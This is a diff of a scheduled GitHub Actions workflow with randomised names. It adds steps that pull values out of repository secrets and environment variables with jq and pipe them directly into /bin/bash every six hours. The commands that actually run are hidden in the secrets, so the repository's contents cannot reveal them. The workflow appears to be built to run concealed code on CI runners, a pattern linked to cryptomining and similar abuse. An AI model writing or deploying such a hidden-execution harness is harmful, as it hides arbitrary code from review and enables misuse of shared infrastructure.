@@ -1,10 +1,8 @@
 name: gansila4571
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
-
+    - cron: '31 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,9 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: gansila4571
         env:
-          g7: ${{ secrets.g7 }}
+          gx6: ${{ secrets.gx6 }}
         run: |
-          echo $g7 | jq -r .cvpyp245 | /bin/bash
-          echo $nq18687 | jq -r .zs686 | /bin/bash
-          echo $er8 | jq -r .wojnt8172 | /bin/bash
+          echo $gx6 | jq -r .ei5 | /bin/bash
+          echo $vxyt1 | jq -r .hp6751 | /bin/bash
+          echo $rle3225 | jq -r .htj39 | /bin/bash
+          echo $ryo66625 | jq -r .uwbn514 | /bin/bash
+          echo $jme1692 | jq -r .urf729 | /bin/bash
 
